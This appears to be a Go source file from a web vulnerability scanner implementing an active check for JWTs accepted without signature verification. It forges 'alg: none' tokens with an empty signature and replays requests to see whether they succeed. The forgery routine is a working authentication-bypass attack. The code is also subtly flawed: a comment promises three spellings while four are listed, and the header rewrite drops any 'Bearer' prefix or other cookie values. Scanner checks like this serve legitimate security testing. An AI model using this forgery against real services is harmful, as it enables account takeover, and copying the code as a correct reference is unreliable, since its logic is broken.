package active

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"strings"

	"github.com/guaidao2/crackweb/internal/checks"
	"github.com/guaidao2/crackweb/internal/finding"
	"github.com/guaidao2/crackweb/internal/httpmsg"
	"github.com/guaidao2/crackweb/internal/i18n"
)

// jwtLocations are the request fields a token is carried in.
var jwtLocations = []string{"Authorization", "Cookie", "X-Auth-Token", "X-Access-Token", "X-Authorization"}

// algNoneSpellings are the ways a token can claim it needs no signature. Some
// libraries compare the algorithm case-sensitively and accept only one of them,
// so all three are tried.
var algNoneSpellings = []string{"none", "None", "NONE", "nOnE"}

// jwt detects a JSON Web Token the application accepts without verifying it.
//
// The test is the algorithm-confusion family's simplest member: take the token
// the application issued, strip its signature, and relabel the algorithm as
// "none". A verifier that trusts the token's own header will accept it, and
// anyone can then mint a token for any user.
//
// It is request-level because the token lives in a header, and because the
// experiment is about the request as a whole — replacing the credential and
// seeing whether the same request still succeeds.
type jwt struct{}

func (jwt) ID() string                 { return "jwt" }
func (jwt) TitleKey() i18n.Key         { return i18n.KeyCheckJWTTitle }
func (jwt) DescriptionKey() i18n.Key   { return i18n.KeyCheckJWTDesc }
func (jwt) RemediationKey() i18n.Key   { return i18n.KeyCheckJWTFix }
func (jwt) Severity() finding.Severity { return finding.SeverityCritical }
func (jwt) Tags() []string {
	return []string{"active", "authentication", "jwt", "owasp-top10"}
}
func (jwt) Passive() bool { return false }

// IsRequestLevel marks this as a check that rewrites a credential in place.
func (jwt) IsRequestLevel() bool { return true }

func (jwt) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t == nil || t.Request == nil || t.Response == nil {
		return nil
	}
	// A request that already failed gives no baseline: an unchanged rejection
	// after forgery would prove nothing either way.
	if t.Response.Status >= 400 {
		return nil
	}

	field, original := findJWT(t.Request)
	if original == "" {
		return nil
	}
	parts := strings.Split(original, ".")
	if len(parts) != 3 {
		return nil
	}
	// The header has to be readable, or there is nothing to rewrite.
	header, err := decodeJWTPart(parts[0])
	if err != nil {
		return nil
	}

	for _, spelling := range algNoneSpellings {
		forgedHeader := map[string]any{}
		for k, v := range header {
			forgedHeader[k] = v
		}
		forgedHeader["alg"] = spelling
		// A token that needs no signature is sent with an empty one.
		forged := encodeJWTPart(forgedHeader) + "." + parts[1] + "."

		mutated := t.Request.Clone()
		mutated.Header.Set(field, strings.Replace(original, original, forged, 1))
		response, err := c.Do(ctx, mutated)
		if err != nil || response == nil {
			continue
		}
		// A rejection is correct behaviour, and the signature is doing its job.
		if response.Status >= 400 {
			continue
		}
		// The same request succeeded with a token nobody signed: the application
		// is not verifying, and the credential means nothing.
		if strings.Contains(strings.ToLower(string(response.Body)), "invalid") ||
			strings.Contains(strings.ToLower(string(response.Body)), "unauthorized") {
			continue
		}

		f := checks.NewFinding(jwt{}, t,
			i18n.KeyCheckJWTTitle, i18n.KeyCheckJWTDesc, i18n.KeyCheckJWTFix)
		f.Severity = finding.SeverityCritical
		f.Confidence = finding.ConfidenceCertain
		f.Method = mutated.Method
		f.URL = mutated.URLString()
		f.Payload = forged
		f.CWE = "CWE-347"
		f.References = []string{
			"https://portswigger.net/web-security/jwt",
			"https://cwe.mitre.org/data/definitions/347.html",
		}
		f.Evidence.Request = mutated.Raw()
		f.Evidence.Response = truncate(response.Body, 8192)
		f.Evidence.Baseline = truncate(t.Response.Body, 4096)
		f.Evidence.Matches = []string{
			field + ": alg=" + spelling + " with an empty signature was accepted",
		}
		return []*finding.Finding{f}
	}
	return nil
}

// findJWT returns the field a token was found in and the token itself.
func findJWT(req *httpmsg.Request) (field, token string) {
	for _, name := range jwtLocations {
		value := req.Header.Get(name)
		if value == "" {
			continue
		}
		if found := extractJWT(value); found != "" {
			return name, found
		}
	}
	return "", ""
}

// extractJWT pulls a JWT out of a header value, which may hold more than one
// credential (a Cookie header, for instance).
func extractJWT(value string) string {
	for _, part := range strings.FieldsFunc(value, func(r rune) bool {
		return r == ' ' || r == ';' || r == ',' || r == '='
	}) {
		part = strings.Trim(part, `"'`)
		if strings.Count(part, ".") != 2 {
			continue
		}
		// A JWT always starts with a base64url-encoded object: `{"` is `ey`.
		if !strings.HasPrefix(part, "ey") {
			continue
		}
		return part
	}
	return ""
}

// decodeJWTPart decodes a base64url segment into a generic object.
func decodeJWTPart(part string) (map[string]any, error) {
	raw, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(part, "="))
	if err != nil {
		return nil, err
	}
	out := map[string]any{}
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, err
	}
	return out, nil
}

// encodeJWTPart encodes an object into a base64url segment.
func encodeJWTPart(value map[string]any) string {
	raw, err := json.Marshal(value)
	if err != nil {
		return ""
	}
	return base64.RawURLEncoding.EncodeToString(raw)
}
